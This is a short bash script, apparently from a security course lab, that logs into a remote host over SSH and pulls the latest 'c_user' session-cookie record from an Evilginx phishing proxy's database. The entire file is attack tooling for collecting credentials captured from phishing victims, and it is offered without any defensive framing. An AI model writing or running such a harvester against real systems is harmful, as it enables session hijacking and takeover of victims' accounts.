#/bin/bash

output=$(ssh -tt cs3235@192.168.1.3 "awk '/c_user/' /root/.evilginx/data.db | tail -1")
echo $output
